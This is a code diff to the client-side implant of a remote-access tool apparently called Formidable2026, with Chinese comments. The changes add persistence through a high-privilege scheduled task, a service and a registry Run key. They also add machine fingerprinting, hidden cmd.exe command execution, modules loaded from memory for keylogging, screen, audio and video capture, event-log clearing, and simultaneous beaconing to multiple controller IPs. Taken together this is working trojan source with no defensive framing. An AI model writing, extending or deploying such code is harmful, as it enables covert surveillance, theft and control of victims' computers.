@@ -1,6 +1,9 @@
 ﻿#ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -36,6 +39,11 @@ HMEMORYMODULE g_hMultimediaModule = NULL;
 PFN_MODULE_ENTRY g_pMultimediaEntry = NULL;
 std::map<uint32_t, HMEMORYMODULE> g_ModuleCache;
 std::map<uint32_t, PFN_MODULE_ENTRY> g_ModuleEntryCache;
+
+// 多端控制互斥锁，防止资源冲突
+CRITICAL_SECTION g_ModuleMutex;
+CRITICAL_SECTION g_TerminalMutex;
+CRITICAL_SECTION g_MultimediaMutex;
 
 // 路径展开助手
 std::wstring ExpandPath(const std::wstring& path) {
@@ -140,16 +148,73 @@ void InstallClient() {
     wchar_t szPath[MAX_PATH];
     GetModuleFileNameW(NULL, szPath, MAX_PATH);
     
-    // 1. 注册表启动
-    if (g_ServerConfig.iStartup == 1) {
-        HKEY hKey;
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExW(hKey, L"Formidable2026", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) * 2 + 2));
-            RegCloseKey(hKey);
+    // 1. 计划任务自启
+    if (g_ServerConfig.taskStartup == 1) {
+        wchar_t szTaskXml[MAX_PATH * 2];
+        swprintf_s(szTaskXml, MAX_PATH * 2,
+            L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
+            L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
+            L"<RegistrationInfo>"
+            L"<Date>2026-02-08T00:00:00.000000</Date>"
+            L"<Author>System</Author>"
+            L"</RegistrationInfo>"
+            L"<Triggers>"
+            L"<LogonTrigger>"
+            L"<Enabled>true</Enabled>"
+            L"</LogonTrigger>"
+            L"</Triggers>"
+            L"<Principals>"
+            L"<Principal id=\"Author\">"
+            L"<UserId>S-1-5-32-544</UserId>"
+            L"<LogonType>InteractiveToken</LogonType>"
+            L"<RunLevel>HighestAvailable</RunLevel>"
+            L"</Principal>"
+            L"</Principals>"
+            L"<Settings>"
+            L"<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
+            L"<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
+            L"<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
+            L"<AllowHardTerminate>true</AllowHardTerminate>"
+            L"<StartWhenAvailable>false</StartWhenAvailable>"
+            L"<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
+            L"<IdleSettings>"
+            L"<StopOnIdleEnd>true</StopOnIdleEnd>"
+            L"<RestartOnIdle>false</RestartOnIdle>"
+            L"</IdleSettings>"
+            L"<AllowStartOnDemand>true</AllowStartOnDemand>"
+            L"<Enabled>true</Enabled>"
+            L"<Hidden>false</Hidden>"
+            L"<RunOnlyIfIdle>false</RunOnlyIfIdle>"
+            L"<WakeToRun>false</WakeToRun>"
+            L"<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>"
+            L"<Priority>7</Priority>"
+            L"</Settings>"
+            L"<Actions Context=\"Author\">"
+            L"<Exec>"
+            L"<Command>%s</Command>"
+            L"</Exec>"
+            L"</Actions>"
+            L"</Task>",
+            szPath);
+
+        wchar_t szTempXml[MAX_PATH];
+        GetTempPathW(MAX_PATH, szTempXml);
+        wcscat_s(szTempXml, L"\\Formidable_Task.xml");
+        HANDLE hFile = CreateFileW(szTempXml, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD written;
+            WriteFile(hFile, szTaskXml, (DWORD)(wcslen(szTaskXml) * sizeof(wchar_t)), &written, NULL);
+            CloseHandle(hFile);
+            
+            wchar_t szCmd[MAX_PATH * 2];
+            swprintf_s(szCmd, MAX_PATH * 2, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f", szTempXml);
+            _wsystem(szCmd);
+            DeleteFileW(szTempXml);
         }
-    } 
-    // 2. 服务启动
-    else if (g_ServerConfig.iStartup == 2 || g_ServerConfig.runningType == 1) { // 运行方式为服务
+    }
+
+    // 2. 服务自启
+    if (g_ServerConfig.serviceStartup == 1) {
         SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if (hSCM) {
             SC_HANDLE hService = CreateServiceW(
@@ -164,6 +229,64 @@ void InstallClient() {
             CloseServiceHandle(hSCM);
         }
     }
+
+    // 3. 注册表自启
+    if (g_ServerConfig.registryStartup == 1) {
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+            RegSetValueExW(hKey, L"Formidable2026", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) * 2 + 2));
+            RegCloseKey(hKey);
+        }
+    }
+
+    // 旧的iStartup逻辑已被新的自启选项替代，不再执行
+    // 只有当用户明确勾选新的自启选项时才执行自启
+}
+
+static uint64_t Fnv1a64(const void* data, size_t len) {
+    const unsigned char* p = (const unsigned char*)data;
+    uint64_t hash = 1469598103934665603ULL;
+    for (size_t i = 0; i < len; ++i) {
+        hash ^= (uint64_t)p[i];
+        hash *= 1099511628211ULL;
+    }
+    return hash;
+}
+
+static uint64_t GetStableClientUniqueId() {
+    if (g_ServerConfig.clientID != 0) return g_ServerConfig.clientID;
+
+    std::wstring machineGuid;
+    HKEY hKey = NULL;
+    LONG rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0,
+        KEY_READ | KEY_WOW64_64KEY, &hKey);
+    if (rc != ERROR_SUCCESS) {
+        rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey);
+    }
+    if (rc == ERROR_SUCCESS && hKey) {
+        wchar_t buf[256] = { 0 };
+        DWORD cb = sizeof(buf);
+        DWORD type = 0;
+        if (RegQueryValueExW(hKey, L"MachineGuid", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS && type == REG_SZ) {
+            machineGuid = buf;
+        }
+        RegCloseKey(hKey);
+    }
+
+    if (machineGuid.empty()) {
+        wchar_t comp[256] = { 0 };
+        DWORD csz = 256;
+        if (GetComputerNameW(comp, &csz)) machineGuid = comp;
+    }
+
+    std::string guidUtf8 = WideToUTF8(machineGuid);
+    uint64_t h = guidUtf8.empty() ? 0 : Fnv1a64(guidUtf8.data(), guidUtf8.size());
+    if (h == 0) {
+        uint64_t t = GetTickCount64();
+        h = Fnv1a64(&t, sizeof(t)) ^ ((uint64_t)GetCurrentProcessId() << 32) ^ (uint64_t)GetCurrentThreadId();
+        if (h == 0) h = 1;
+    }
+    return h;
 }
 
 // 获取基本信息
@@ -198,6 +321,15 @@ void GetClientInfo(ClientInfo& info) {
     info.is64Bit = (bits == 64);
     info.isAdmin = IsAdmin() ? 1 : 0;
     info.clientType = g_ServerConfig.iType; // 默认被控端类型
+    info.clientUniqueId = GetStableClientUniqueId();
+    info.hasCamera = CheckCameraExistence() ? 1 : 0;
+    info.hasTelegram = CheckTelegramInstalled() ? 1 : 0;
+    {
+        wchar_t exePathW[MAX_PATH] = { 0 };
+        GetModuleFileNameW(NULL, exePathW, MAX_PATH);
+        std::string exePath = WideToUTF8(exePathW);
+        strncpy(info.programPath, exePath.c_str(), sizeof(info.programPath) - 1);
+    }
     
     // 分组信息
     std::wstring wGroup = UTF8ToWide(g_ServerConfig.szGroupName);
@@ -251,6 +383,7 @@ uint32_t GetModuleKey(uint32_t cmd) {
     switch (cmd) {
         case CMD_PROCESS_LIST:
         case CMD_PROCESS_KILL:
+        case CMD_PROCESS_MODULES:
             return CMD_PROCESS_LIST;
         case CMD_WINDOW_LIST:
         case CMD_WINDOW_CTRL:
@@ -264,6 +397,9 @@ uint32_t GetModuleKey(uint32_t cmd) {
         case CMD_FILE_RUN:
             return CMD_FILE_LIST;
         case CMD_SERVICE_LIST:
+        case CMD_SERVICE_START:
+        case CMD_SERVICE_STOP:
+        case CMD_SERVICE_DELETE:
             return CMD_SERVICE_LIST;
         case CMD_REGISTRY_CTRL:
             return CMD_REGISTRY_CTRL;
@@ -279,8 +415,14 @@ void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         effectiveCmd = pkg->arg2;
     }
 
+    char dbgMsg[256];
+    sprintf_s(dbgMsg, "[FRMD26] LoadModuleFromMemory: cmd=%u, effectiveCmd=%u, hasDll=%d, totalDataLen=%d\n",
+        pkg->cmd, effectiveCmd, hasDll, totalDataLen);
+    OutputDebugStringA(dbgMsg);
+
     // 1. 终端模块缓存处理
     if (effectiveCmd == CMD_TERMINAL_OPEN) {
+        EnterCriticalSection(&g_TerminalMutex);
         if (g_hTerminalModule) {
             if (g_pTerminalEntry) {
                  CommandPkg closePkg = { CMD_TERMINAL_CLOSE, 0, 0 };
@@ -290,21 +432,30 @@ void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
             g_hTerminalModule = NULL;
             g_pTerminalEntry = NULL;
         }
+        LeaveCriticalSection(&g_TerminalMutex);
     }
     
     // 2. 多媒体模块缓存处理 (Screen, Video, Voice, Keylog, Mouse, Key)
     bool isMultimedia = (effectiveCmd == CMD_SCREEN_CAPTURE || effectiveCmd == CMD_VIDEO_STREAM || 
                          effectiveCmd == CMD_VOICE_STREAM || effectiveCmd == CMD_KEYLOG ||
                          effectiveCmd == CMD_MOUSE_EVENT || effectiveCmd == CMD_KEY_EVENT ||
-                         effectiveCmd == CMD_SCREEN_FPS || effectiveCmd == CMD_SCREEN_QUALITY);
+                         effectiveCmd == CMD_SCREEN_FPS || effectiveCmd == CMD_SCREEN_QUALITY ||
+                         effectiveCmd == CMD_SCREEN_COMPRESS);
 
     if (isMultimedia && g_hMultimediaModule) {
+        EnterCriticalSection(&g_MultimediaMutex);
         if (g_pMultimediaEntry) {
-            if (hasDll) {
-                pkg->arg1 = pkg->arg2;
+            if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
+                CommandPkg runPkg = { 0 };
+                runPkg.cmd = effectiveCmd;
+                runPkg.arg1 = 1;
+                runPkg.arg2 = 0;
+                g_pMultimediaEntry(s, &runPkg);
+            } else {
+                g_pMultimediaEntry(s, pkg);
             }
-            g_pMultimediaEntry(s, pkg);
         }
+        LeaveCriticalSection(&g_MultimediaMutex);
         return;
     }
 
@@ -319,35 +470,43 @@ void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         if (pEntry) {
             // 如果是终端模块，需要常驻内存
             if (effectiveCmd == CMD_TERMINAL_OPEN) {
+                EnterCriticalSection(&g_TerminalMutex);
                 g_hTerminalModule = hMod;
                 g_pTerminalEntry = pEntry;
-                pEntry(s, pkg); // 这里的 pkg->cmd 可能是 CMD_LOAD_MODULE，但模块内部应该处理或者我们改一下
+                LeaveCriticalSection(&g_TerminalMutex);
+                OutputDebugStringA("[FRMD26] Terminal module loaded, calling entry function\n");
+                pEntry(s, pkg); 
                 return; 
             }
             // 如果是多媒体模块，也需要常驻内存
             if (isMultimedia) {
+                EnterCriticalSection(&g_MultimediaMutex);
                 g_hMultimediaModule = hMod;
                 g_pMultimediaEntry = pEntry;
-                if (hasDll) pkg->arg1 = pkg->arg2;
-                pEntry(s, pkg);
+                LeaveCriticalSection(&g_MultimediaMutex);
+                CommandPkg runPkg = { 0 };
+                runPkg.cmd = effectiveCmd;
+                runPkg.arg1 = 1;
+                runPkg.arg2 = 0;
+                pEntry(s, &runPkg);
                 return;
             }
 
             uint32_t moduleKey = GetModuleKey(effectiveCmd);
-            if (moduleKey == 0) moduleKey = effectiveCmd; // 如果 GetModuleKey 没定义，就用当前的
+            if (moduleKey == 0) moduleKey = effectiveCmd;
 
+            EnterCriticalSection(&g_ModuleMutex);
             auto it = g_ModuleCache.find(moduleKey);
             if (it != g_ModuleCache.end()) {
                 MemoryFreeLibrary(it->second);
             }
             g_ModuleCache[moduleKey] = hMod;
             g_ModuleEntryCache[moduleKey] = pEntry;
+            LeaveCriticalSection(&g_ModuleMutex);
 
             // 执行初始命令
             CommandPkg runPkg = *pkg;
             runPkg.cmd = moduleKey;
-            // 保持原有的 arg1, arg2 可能不合适，因为 arg1 是 dllSize
-            // 但有些模块可能需要原有的参数，不过通常 CMD_LOAD_MODULE 时不需要
             runPkg.arg1 = 0; 
             runPkg.arg2 = 0;
             pEntry(s, &runPkg);
@@ -382,9 +541,6 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
             SendPkg(s, buffer.data(), (int)bodySize);
             break;
         }
-        case CMD_SHELL_EXEC:
-            WinExec(pkg->data, SW_HIDE);
-            break;
         case CMD_CLIPBOARD_GET: {
             std::string text = GetClipboardText();
             size_t bodySize = sizeof(CommandPkg) - 1 + text.size();
@@ -506,6 +662,18 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
             ShellExecuteW(NULL, L"open", wUrl.c_str(), NULL, NULL, SW_SHOW);
             break;
         }
+        case CMD_SHELL_EXEC: {
+            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+            if (dataLen > 0) {
+                std::string cmd(pkg->data, dataLen);
+                std::wstring wCmd = UTF8ToWide(cmd);
+                
+                // 解析命令和参数
+                // 简单的实现：直接传给 ShellExecute
+                ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c " + wCmd).c_str(), NULL, SW_HIDE);
+            }
+            break;
+        }
         case CMD_CLEAN_EVENT_LOG: {
             EnableDebugPrivilege();
             
@@ -548,12 +716,22 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         case CMD_TERMINAL_OPEN:
             LoadModuleFromMemory(s, pkg, totalDataLen);
             break;
-        case CMD_TERMINAL_DATA:
+        case CMD_TERMINAL_DATA: {
+            char dbgMsg[256];
+            sprintf_s(dbgMsg, "[FRMD26] CMD_TERMINAL_DATA: arg1=%u, dataLen=%d\n", pkg->arg1, pkg->arg1);
+            OutputDebugStringA(dbgMsg);
+            EnterCriticalSection(&g_TerminalMutex);
             if (g_pTerminalEntry) {
+                OutputDebugStringA("[FRMD26] Calling terminal entry function for CMD_TERMINAL_DATA\n");
                 g_pTerminalEntry(s, pkg);
+            } else {
+                OutputDebugStringA("[ERROR] g_pTerminalEntry is NULL!\n");
             }
+            LeaveCriticalSection(&g_TerminalMutex);
             break;
+        }
         case CMD_TERMINAL_CLOSE:
+            EnterCriticalSection(&g_TerminalMutex);
             if (g_pTerminalEntry) {
                 g_pTerminalEntry(s, pkg);
                 if (g_hTerminalModule) {
@@ -562,6 +740,7 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
                     g_pTerminalEntry = NULL;
                 }
             }
+            LeaveCriticalSection(&g_TerminalMutex);
             break;
         case CMD_LOAD_MODULE:
             LoadModuleFromMemory(s, pkg, totalDataLen);
@@ -571,18 +750,28 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         case CMD_FILE_DOWNLOAD_DIR:
         case CMD_PROCESS_LIST:
         case CMD_PROCESS_KILL:
+        case CMD_PROCESS_MODULES:
         case CMD_WINDOW_LIST:
         case CMD_WINDOW_CTRL:
         case CMD_SERVICE_LIST:
+        case CMD_SERVICE_START:
+        case CMD_SERVICE_STOP:
+        case CMD_SERVICE_DELETE:
         case CMD_REGISTRY_CTRL: {
+            char dbgMsg[256];
+            sprintf_s(dbgMsg, "[FRMD26] Routing command %u: arg1=%u, arg2=%u\n", pkg->cmd, pkg->arg1, pkg->arg2);
+            OutputDebugStringA(dbgMsg);
             uint32_t moduleKey = GetModuleKey(pkg->cmd);
+            EnterCriticalSection(&g_ModuleMutex);
             auto it = g_ModuleEntryCache.find(moduleKey);
             if (it != g_ModuleEntryCache.end()) {
+                LeaveCriticalSection(&g_ModuleMutex);
+                OutputDebugStringA("[FRMD26] Module found in cache, calling entry function\n");
                 it->second(s, pkg);
                 break;
             }
-            // 修复：终端模块未加载时的错误处理
-            OutputDebugStringA("[ERROR] 模块未找到！请检查模块是否正确加载\n");
+            LeaveCriticalSection(&g_ModuleMutex);
+            OutputDebugStringA("[ERROR] Module not found in cache! Loading from memory\n");
             LoadModuleFromMemory(s, pkg, totalDataLen);
             break;
         }
@@ -594,6 +783,7 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         case CMD_KEY_EVENT:
         case CMD_SCREEN_FPS:
         case CMD_SCREEN_QUALITY:
+        case CMD_SCREEN_COMPRESS:
             LoadModuleFromMemory(s, pkg, totalDataLen);
             break;
         case CMD_EXIT:
@@ -601,8 +791,88 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
             break;
     }
 }
+
+struct ConnectionContext {
+    SOCKET s;
+    std::string serverIp;
+    std::string serverPort;
+    std::atomic<bool>* bConnected;
+    std::atomic<bool>* bShouldExit;
+};
+
+void HandleConnection(ConnectionContext* ctx) {
+    char dbgMsg[256];
+    sprintf_s(dbgMsg, "[FRMD26] 已连接到 %s:%s\n", ctx->serverIp.c_str(), ctx->serverPort.c_str());
+    OutputDebugStringA(dbgMsg);
+    
+    ctx->bConnected->store(true);
+    
+    ClientInfo info;
+    GetClientInfo(info);
+    SendPkg(ctx->s, &info, sizeof(ClientInfo));
+    
+    std::thread heartbeatThread([ctx]() {
+        while (!ctx->bShouldExit->load() && ctx->bConnected->load()) {
+            Sleep(30000);
+            if (!ctx->bConnected->load() || ctx->bShouldExit->load()) break;
+            
+            ClientInfo hbInfo;
+            GetClientInfo(hbInfo);
+            
+            size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
+            std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
+            PkgHeader* h = (PkgHeader*)hbBuf.data();
+            memcpy(h->flag, "FRMD26?", 7);
+            h->originLen = (int)hbBodySize;
+            h->totalLen = (int)hbBuf.size();
+            
+            CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
+            p->cmd = CMD_HEARTBEAT;
+            p->arg1 = sizeof(ClientInfo);
+            p->arg2 = 0;
+            memcpy(p->data, &hbInfo, sizeof(ClientInfo));
+            
+            if (send(ctx->s, hbBuf.data(), (int)hbBuf.size(), 0) <= 0) {
+                break;
+            }
+        }
+    });
+    
+    while (!ctx->bShouldExit->load()) {
+        PkgHeader header;
+        int n = recv(ctx->s, (char*)&header, sizeof(PkgHeader), 0);
+        if (n <= 0) break;
+        
+        if (memcmp(header.flag, "FRMD26?", 7) != 0) break;
+        
+        std::vector<char> body(header.originLen);
+        int total = 0;
+        while (total < header.originLen) {
+            int r = recv(ctx->s, body.data() + total, header.originLen - total, 0);
+            if (r <= 0) break;
+            total += r;
+        }
+        
+        if (total == header.originLen) {
+            HandleCommand(ctx->s, (CommandPkg*)body.data(), header.originLen);
+        } else {
+            break;
+        }
+    }
+    
+    ctx->bConnected->store(false);
+    if (heartbeatThread.joinable()) {
+        heartbeatThread.join();
+    }
+}
+
 void ClientMain() {
     srand((unsigned int)time(NULL));
+    
+    // 初始化多端控制互斥锁
+    InitializeCriticalSection(&g_ModuleMutex);
+    InitializeCriticalSection(&g_TerminalMutex);
+    InitializeCriticalSection(&g_MultimediaMutex);
     
     // 调试：显示原始配置
     char dbgInit[512];
@@ -666,128 +936,144 @@ void ClientMain() {
         }
     }
 
-    // 智能重连机制：指数退避策略
-    int reconnectDelay = 5000;      // 初始重连延迟 5秒
-    const int maxReconnectDelay = 300000;  // 最大重连延迟 5分钟
-    const int minReconnectDelay = 5000;    // 最小重连延迟 5秒
-    int currentIpIndex = 0;
-    int failedAttempts = 0;
-    
-    while (true) {
-        // 轮询IP列表
-        const std::string& serverIp = ipList[currentIpIndex % ipList.size()];
-        if (serverIp.empty()) {
-            currentIpIndex++;
-            continue;
-        }
+    if (g_ServerConfig.runningType == 1) { // 并发上线模式
+        sprintf_s(dbgInit, "[FRMD26] 启动并发上线模式，连接 %zu 个主控端\n", ipList.size());
+        OutputDebugStringA(dbgInit);
         
-        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (s == INVALID_SOCKET) {
-            Sleep(reconnectDelay);
-            continue;
-        }
-
-        // 设置超时
-        DWORD timeout = 15000; // 15秒连接超时
-        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
-        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+        std::vector<std::thread> connectionThreads;
+        std::vector<std::unique_ptr<ConnectionContext>> contexts;
+        std::vector<std::unique_ptr<std::atomic<bool>>> bConnected;
+        std::vector<std::unique_ptr<std::atomic<bool>>> bShouldExit;
         
-        sockaddr_in addr = { 0 };
-        addr.sin_family = AF_INET;
-        addr.sin_port = htons((unsigned short)atoi(g_ServerConfig.szPort));
-        addr.sin_addr.s_addr = inet_addr(serverIp.c_str());
-
-        if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
-            // 连接成功，重置重连参数
-            reconnectDelay = minReconnectDelay;
-            failedAttempts = 0;
+        for (size_t i = 0; i < ipList.size(); i++) {
+            const std::string& serverIp = ipList[i];
+            if (serverIp.empty()) continue;
             
-            // 调试日志
-            char dbgMsg[256];
-            sprintf_s(dbgMsg, "[FRMD26] 已连接到 %s:%s\n", serverIp.c_str(), g_ServerConfig.szPort);
-            OutputDebugStringA(dbgMsg);
+            bConnected.push_back(std::make_unique<std::atomic<bool>>(false));
+            bShouldExit.push_back(std::make_unique<std::atomic<bool>>(false));
+            contexts.push_back(std::make_unique<ConnectionContext>());
             
-            // 收到上线标志后发送信息
-            // Formidable2026 约定：客户端主动发送裸 ClientInfo（通过 SendPkg 自动添加 PkgHeader）
-            ClientInfo info;
-            GetClientInfo(info);
-            SendPkg(s, &info, sizeof(ClientInfo));
+            contexts.back()->bConnected = bConnected.back().get();
+            contexts.back()->bShouldExit = bShouldExit.back().get();
+            contexts.back()->serverIp = serverIp;
+            contexts.back()->serverPort = g_ServerConfig.szPort;
             
-            // 启动心跳线程
-            std::atomic<bool> bConnected(true);
-            std::thread heartbeatThread([&s, &bConnected]() {
-                while (bConnected.load()) {
-                    Sleep(30000); // 30秒一次心跳
-                    if (!bConnected.load()) break;
-                    
-                    ClientInfo hbInfo;
-                    GetClientInfo(hbInfo);
-                    
-                    size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
-                    std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
-                    PkgHeader* h = (PkgHeader*)hbBuf.data();
-                    memcpy(h->flag, "FRMD26?", 7);
-                    h->originLen = (int)hbBodySize;
-                    h->totalLen = (int)hbBuf.size();
-                    
-                    CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
-                    p->cmd = CMD_HEARTBEAT;
-                    p->arg1 = sizeof(ClientInfo);
-                    p->arg2 = 0;
-                    memcpy(p->data, &hbInfo, sizeof(ClientInfo));
-                    
-                    if (send(s, hbBuf.data(), (int)hbBuf.size(), 0) <= 0) {
-                        break;
+            size_t threadIndex = i;
+            connectionThreads.push_back(std::thread([threadIndex, &contexts, &ipList, &bConnected, &bShouldExit]() {
+                int reconnectDelay = 5000;
+                const int maxReconnectDelay = 300000;
+                const int minReconnectDelay = 5000;
+                int failedAttempts = 0;
+                
+                while (!bShouldExit[threadIndex]->load()) {
+                    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                    if (s == INVALID_SOCKET) {
+                        Sleep(reconnectDelay);
+                        continue;
                     }
+                    
+                    DWORD timeout = 15000;
+                    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+                    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+                    
+                    sockaddr_in addr = { 0 };
+                    addr.sin_family = AF_INET;
+                    addr.sin_port = htons((unsigned short)atoi(contexts[threadIndex]->serverPort.c_str()));
+                    addr.sin_addr.s_addr = inet_addr(contexts[threadIndex]->serverIp.c_str());
+                    
+                    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
+                        reconnectDelay = minReconnectDelay;
+                        failedAttempts = 0;
+                        
+                        ConnectionContext ctx;
+                        ctx.s = s;
+                        ctx.serverIp = contexts[threadIndex]->serverIp;
+                        ctx.serverPort = contexts[threadIndex]->serverPort;
+                        ctx.bConnected = bConnected[threadIndex].get();
+                        ctx.bShouldExit = bShouldExit[threadIndex].get();
+                        
+                        HandleConnection(&ctx);
+                        
+                        closesocket(s);
+                    } else {
+                        failedAttempts++;
+                        if (failedAttempts > 1) {
+                            reconnectDelay = (reconnectDelay * 2 < maxReconnectDelay) ? reconnectDelay * 2 : maxReconnectDelay;
+                        }
+                        closesocket(s);
+                    }
+                    
+                    Sleep(reconnectDelay);
                 }
-            });
-            
-            // 接收和处理命令循环
-            while (true) {
-                PkgHeader header;
-                int n = recv(s, (char*)&header, sizeof(PkgHeader), 0);
-                if (n <= 0) break;
-                
-                // 验证包头
-                if (memcmp(header.flag, "FRMD26?", 7) != 0) break;
-                
-                std::vector<char> body(header.originLen);
-                int total = 0;
-                while (total < header.originLen) {
-                    int r = recv(s, body.data() + total, header.originLen - total, 0);
-                    if (r <= 0) break;
-                    total += r;
-                }
-                
-                if (total == header.originLen) {
-                    HandleCommand(s, (CommandPkg*)body.data(), header.originLen);
-                } else {
-                    break; // 数据不完整，断开重连
-                }
-            }
-            
-            bConnected.store(false);
-            if (heartbeatThread.joinable()) {
-                heartbeatThread.join(); // 等待心跳线程结束
-            }
-        } else {
-            failedAttempts++;
-            // 指数退避：连接失败后延迟加倍
-            if (failedAttempts > 1) {
-                reconnectDelay = (reconnectDelay * 2 < maxReconnectDelay) ? reconnectDelay * 2 : maxReconnectDelay;
-            }
+            }));
         }
         
-        closesocket(s);
+        for (auto& t : connectionThreads) {
+            if (t.joinable()) t.join();
+        }
+    } else { // 随机上线模式
+        sprintf_s(dbgInit, "[FRMD26] 启动随机上线模式\n");
+        OutputDebugStringA(dbgInit);
         
-        // 尝试下一个IP
-        currentIpIndex++;
-        if (currentIpIndex % ipList.size() == 0) {
-            // 所有IP都尝试过一轮，等待后再试
-            Sleep(reconnectDelay);
-        } else {
-            // 快速切换到下一个IP
-            Sleep(1000);
+        int reconnectDelay = 5000;
+        const int maxReconnectDelay = 300000;
+        const int minReconnectDelay = 5000;
+        int currentIpIndex = 0;
+        int failedAttempts = 0;
+        
+        while (true) {
+            const std::string& serverIp = ipList[currentIpIndex % ipList.size()];
+            if (serverIp.empty()) {
+                currentIpIndex++;
+                continue;
+            }
+            
+            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s == INVALID_SOCKET) {
+                Sleep(reconnectDelay);
+                continue;
+            }
+            
+            DWORD timeout = 15000;
+            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+            
+            sockaddr_in addr = { 0 };
+            addr.sin_family = AF_INET;
+            addr.sin_port = htons((unsigned short)atoi(g_ServerConfig.szPort));
+            addr.sin_addr.s_addr = inet_addr(serverIp.c_str());
+            
+            if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
+                reconnectDelay = minReconnectDelay;
+                failedAttempts = 0;
+                
+                std::atomic<bool> bConnected(false);
+                std::atomic<bool> bShouldExit(false);
+                
+                ConnectionContext ctx;
+                ctx.s = s;
+                ctx.serverIp = serverIp;
+                ctx.serverPort = g_ServerConfig.szPort;
+                ctx.bConnected = &bConnected;
+                ctx.bShouldExit = &bShouldExit;
+                
+                HandleConnection(&ctx);
+                
+                closesocket(s);
+            } else {
+                failedAttempts++;
+                if (failedAttempts > 1) {
+                    reconnectDelay = (reconnectDelay * 2 < maxReconnectDelay) ? reconnectDelay * 2 : maxReconnectDelay;
+                }
+                closesocket(s);
+            }
+            
+            currentIpIndex++;
+            if (currentIpIndex % ipList.size() == 0) {
+                Sleep(reconnectDelay);
+            } else {
+                Sleep(1000);
+            }
         }
     }
 }
